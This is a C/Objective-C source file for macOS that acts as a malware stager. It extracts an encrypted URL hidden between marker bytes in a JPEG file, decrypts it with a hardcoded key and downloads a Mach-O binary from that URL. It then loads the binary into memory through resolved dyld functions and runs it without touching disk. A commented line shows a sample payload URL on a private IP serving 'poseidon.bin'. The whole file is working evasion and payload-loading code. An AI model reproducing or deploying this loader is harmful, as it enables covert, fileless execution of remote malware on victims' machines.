
#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>

#import <Foundation/Foundation.h>

#define EXECUTABLE_BASE_ADDR 0x100000000
#define DYLD_BASE 0x00007fff5fc00000

int IS_SIERRA = -1;

int is_sierra(void) {
	// returns 1 if running on Sierra, 0 otherwise
	// this works because /bin/rcp was removed in Sierra
	if(IS_SIERRA == -1) {
		struct stat statbuf;
		IS_SIERRA = (stat("/bin/rcp", &statbuf) != 0);
	}
	return IS_SIERRA;
}

//decrypt our bytes 
unsigned char* DecryptBytes(unsigned char* encrypted_bytes, unsigned char* key, int size_encrypted_bytes, int size_key)
{
        unsigned char* decrypted_code = malloc(size_encrypted_bytes);
		//decryption loop	
        int integer;
        
		for (int i = 0; i < size_encrypted_bytes; i++) 
		{
            //generic wait function
            // if (i % 2 == 0)
            // {
            //     sleep(1);
            // }
            //determine the key byte
            
            if (size_key < i+1)
            {
                integer = encrypted_bytes[i] - key[i%size_key];
            }

            else
            {
                integer = encrypted_bytes[i] - key[i];
            }

			
			
            if (integer < 0)
			{
				integer = 256 + integer;
			}
			decrypted_code[i] = (unsigned char)integer;
		}
	

	int s = strlen(decrypted_code);

	// Occasionally there is a strange problem with decryption, however this while loop will ensure decryption works properly every time.
    while (s > size_encrypted_bytes)
    {
        // printf("%d is length decrypted, but %d is size it should be!\n", s, size_encrypted_bytes);
        // printf("Initiating another round...\n"); 
        
        unsigned char* decrypted = malloc(size_encrypted_bytes); //maybe clean this up...
        decrypted = DecryptBytes(encrypted_bytes, key, size_encrypted_bytes, size_key);
        if (strlen(decrypted) == size_encrypted_bytes)
        {  
        return decrypted;
        }
        break;

    }
	return decrypted_code;
}
//Find header byte offset
int find_header(unsigned const char* buffer, int size_file)
{
    //place header offset bytes here:
    int head_byte_offset;
unsigned char header1[1] = { 0x59 };
unsigned char header2[1] = { 0x4e };
    //Find the index of where encrypted byte stream begins
for (int i =0; i< size_file; i++)
{
    if (buffer[i] == header1[0])
    {
     if (buffer[i+1] == header1[0])
    {
        if (buffer[i+2] == header1[0])
    {
        if (buffer[i+3] == header1[0])
    {
        if (buffer[i+4] == header1[0])
    {   
        
            ////printf("%d is the beginning, and %02X is the byte\n", i, buffer[i]);
            head_byte_offset = i+5;

        
    }
    }
    }
    }
    }

    if (buffer[i] == header2[0])
    {
        if (buffer[i+1] == header2[0])
    {
        if (buffer[i+2] == header2[0])
    {
        if (buffer[i+3] == header2[0])
    {
        if (buffer[i+4] == header2[0])
    {
        
            ////printf("%d is the beginning, and %02X is the byte\n", i, buffer[i]);
            head_byte_offset = i+5;
        
    }
    }
    }
    }
    }
}
return head_byte_offset;
}

//find last byte of offset
int find_footer(unsigned const char* buffer, int size_file)
{
    //place trail offset bytes here:
    int trail_byte_offset = 0;
unsigned char tail1[1] = { 0xab };
unsigned char tail2[1] = { 0x97 };
    
    for (int i =0; i< size_file; i++)
    {
    //Find the index of where the byte stream ends
    if (buffer[i] == tail1[0])
    {
    if (buffer[i+1] == tail1[0])
{
    if (buffer[i+2] == tail1[0])
{
    if (buffer[i+3] == tail1[0])
{
    if (buffer[i+4] == tail1[0])
{   
    
            ////printf("%d is the end, and %02X is the byte\n", i, buffer[i]);
            trail_byte_offset = i;
    
    }
    }
    }
    }
    }

    if (buffer[i] == tail2[0])
    {
    if (buffer[i+1] == tail2[0])
{
    if (buffer[i+2] == tail2[0])
{
    if (buffer[i+3] == tail2[0])
{
    if (buffer[i+4] == tail2[0])
{
    
            ////printf("%d is the end, and %02X is the byte\n", i, buffer[i]);
            trail_byte_offset = i;
        
    }
    }
    }
    }
    }
    
}
return trail_byte_offset;
}


int find_macho(unsigned long addr, unsigned long *base, unsigned int increment, unsigned int dereference) {
	unsigned long ptr;

	// find a Mach-O header by searching from address.
	*base = 0;
		
	while(1) {
		ptr = addr;
		if(dereference) ptr = *(unsigned long *)ptr;
		chmod((char *)ptr, 0777);
		if(errno == 2 /*ENOENT*/ &&
			((int *)ptr)[0] == 0xfeedfacf /*MH_MAGIC_64*/) {
			*base = ptr;
			return 0;
		}

		addr += increment;
	}
	return 1;
}

int find_epc(unsigned long base, struct entry_point_command **entry) {
	// find the entry point command by searching through base's load commands

	struct mach_header_64 *mh;
	struct load_command *lc;

	unsigned long text = 0;

	*entry = NULL;

	mh = (struct mach_header_64 *)base;
	lc = (struct load_command *)(base + sizeof(struct mach_header_64));
	for(int i=0; i<mh->ncmds; i++) {
		if(lc->cmd == LC_MAIN) {	//0x80000028
			*entry = (struct entry_point_command *)lc;
			return 0;
		}

		lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
	}

	return 1;
}

unsigned long resolve_symbol(unsigned long base, unsigned int offset, unsigned int match) {
	// Parse the symbols in the Mach-O image at base and return the address of the one
	// matched by the offset / int pair (offset, match)
	struct load_command *lc;
	struct segment_command_64 *sc, *linkedit, *text;
	struct symtab_command *symtab;
	struct nlist_64 *nl;

	char *strtab;

	symtab = 0;
	linkedit = 0;
	text = 0;

	lc = (struct load_command *)(base + sizeof(struct mach_header_64));
	for(int i=0; i<((struct mach_header_64 *)base)->ncmds; i++) {
		if(lc->cmd == 0x2/*LC_SYMTAB*/) {
			symtab = (struct symtab_command *)lc;
		} else if(lc->cmd == 0x19/*LC_SEGMENT_64*/) {
			sc = (struct segment_command_64 *)lc;
			switch(*((unsigned int *)&((struct segment_command_64 *)lc)->segname[2])) { //skip __
			case 0x4b4e494c:	//LINK
				linkedit = sc;
				break;
			case 0x54584554:	//TEXT
				text = sc;
				break;
			}
		}
		lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
	}

	if(!linkedit || !symtab || !text) return -1;

	unsigned long file_slide = linkedit->vmaddr - text->vmaddr - linkedit->fileoff;
	strtab = (char *)(base + file_slide + symtab->stroff);

	nl = (struct nlist_64 *)(base + file_slide + symtab->symoff);
	for(int i=0; i<symtab->nsyms; i++) {
		char *name = strtab + nl[i].n_un.n_strx;
		if(*(unsigned int *)&name[offset] == match) {
			if(is_sierra()) {
				return base + nl[i].n_value;
			} else {
				return base - DYLD_BASE + nl[i].n_value;
			}
		}
	}

	return -1;
}

int load_and_exec(char *path_to_file, unsigned long dyld) {
	// Load the binary specified by path_to_file using dyld
	char *binbuf = NULL;
	unsigned int size;
	unsigned long addr;


	NSObjectFileImageReturnCode(*create_file_image_from_memory)(const void *, size_t, NSObjectFileImage *) = NULL;
	NSModule (*link_module)(NSObjectFileImage, const char *, unsigned long) = NULL;

	//resolve symbols for NSCreateFileImageFromMemory & NSLinkModule
	addr = resolve_symbol(dyld, 25, 0x4d6d6f72);
	if(addr == -1) {
		fprintf(stderr, "Could not resolve symbol: _sym[25] == 0x4d6d6f72.\n");
		//goto err;
        return -1;
	}
	create_file_image_from_memory = (NSObjectFileImageReturnCode (*)(const void *, size_t, NSObjectFileImage *)) addr;

	addr = resolve_symbol(dyld, 4, 0x4d6b6e69);
	if(addr == -1) {
		fprintf(stderr, "Could not resolve symbol: _sym[4] == 0x4d6b6e69.\n");
		//goto err;
        return -1;
	}
	link_module = (NSModule (*)(NSObjectFileImage, const char *, unsigned long)) addr;


    NSString *stringURL = [NSString stringWithFormat:@"%s", path_to_file];
    NSURL  *url = [NSURL URLWithString:stringURL];
    NSData *urlData = [NSData dataWithContentsOfURL:url];
    
    if ( urlData )
    {
        
        
        int size = urlData.length;
        char** buf = &binbuf;
        //printf("Size is %d", size);

            
        // if((*buf = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON, -1, 0)) == MAP_FAILED) return 1;
        //   if(read(urlData, *buf, size * sizeof(char)) != size) {
        //      free(*buf);
        //      *buf = NULL;
        //      return 1;
         // }
        
	//close(urlData);
    
    const char* binbuf = (const char*)[urlData bytes];
  
    // binbuf = (char*)[urlData bytes];
	// // // load path_to_file into a buf in memory
	// // if(load_from_path(path_to_file, &binbuf)) goto err;

	// change the filetype to a bundle
	int type = ((int *)binbuf)[3];
	if(type != 0x8) ((int *)binbuf)[3] = 0x8; //change to mh_bundle type
    //printf("%02X", type);
   
	// create file image
	NSObjectFileImage fi; 
	if(create_file_image_from_memory(binbuf, size, &fi) != 1) {
		fprintf(stderr, "Could not create image.\n");
		goto err;
	}

	// link image
	NSModule nm = link_module(fi, "mytest", NSLINKMODULE_OPTION_PRIVATE |
						                NSLINKMODULE_OPTION_BINDNOW);
	if(!nm) {
		fprintf(stderr, "Could not link image.\n");
		goto err;
	}

	// find entry point and call it
	if(type == 0x2) { //mh_execute
		unsigned long execute_base;
		struct entry_point_command *epc;

		if(find_macho((unsigned long)nm, &execute_base, sizeof(int), 1)) {
			fprintf(stderr, "Could not find execute_base.\n");
			goto err;
		}

		if(find_epc(execute_base, &epc)) {
			fprintf(stderr, "Could not find entrypt command.\n");
			goto err;
		}

		int(*main)(int, char**, char**, char**) = (int(*)(int, char**, char**, char**))(execute_base + epc->entryoff); 
		char *argv[]={"test", NULL};
		int argc = 1;
		char *env[] = {NULL};
		char *apple[] = {NULL};
		return main(argc, argv, env, apple);
	}	
err:
	if(binbuf) free(binbuf);
	return 1;
}
    return 0;
}

int main(int ac, char **av) {
    
sleep(2); //added delay because it seems to produce more reliable execution


	//key here:
unsigned char* key = "\x73\x80\x59\x9d\x10\x2b\x3e\xee\x3d\x88\x43\xad\xf1\xe0\x88\xa6";

//size_key here:
int size_key = 16.0;

//stego file location:
NSString *file = [NSString stringWithFormat:@"/tmp/test.jpeg"];
NSData* data0 = [NSData dataWithContentsOfFile:file options:NSDataReadingUncached error:NULL];

unsigned const char* buffer = (unsigned const char*)[data0 bytes];
//printf("%d is the size of the file\n", data0.length);

int size_file = data0.length;

int head_byte_offset = find_header(buffer, size_file);
int trail_byte_offset = find_footer(buffer, size_file);

//printf("%d is head byte position, %d is trail byte position\n", head_byte_offset, trail_byte_offset);
int j = head_byte_offset;
int size_encrypted_bytes = trail_byte_offset-head_byte_offset;
unsigned char* encrypted_bytes = malloc(size_encrypted_bytes); //carve out as much memory as we need for our encrypted bytes based on offsets

int count = 0;
//carve out the encrypted bytes
for (j; j < trail_byte_offset+1; j++)
{
    
    encrypted_bytes[count] = buffer[j];
    //printf("%02X", buffer[j]);
    count = count + 1; //use count to increase index for encrypted_bytes
}

unsigned char* decrypted = malloc(size_encrypted_bytes);
decrypted = DecryptBytes(encrypted_bytes, key, size_encrypted_bytes, size_key);
free(buffer);
	//uncomment this for normal binary

	//  if(ac != 2) {
	//  	fprintf(stderr, "usage: %s <path_to_file>\n", av[0]);
	//  	exit(1);
	//  }

//const unsigned char* url = (const unsigned char*) decrypted; 


//printf("%s is the decrypted string\n", decrypted);
//sleep(1);
	unsigned long binary, dyld; 

	// find dyld based on os version
	if(is_sierra()) {
		if(find_macho(EXECUTABLE_BASE_ADDR, &binary, 0x1000, 0)) return 1;
		if(find_macho(binary + 0x1000, &dyld, 0x1000, 0)) return 1;
	} else {
		if(find_macho(DYLD_BASE, &dyld, 0x1000, 0)) return 1;
	}
    
	//av[1] = "http://172.16.29.128:8000/poseidon.bin";
	// load and execute the specified binary
	return load_and_exec(decrypted, dyld);
}
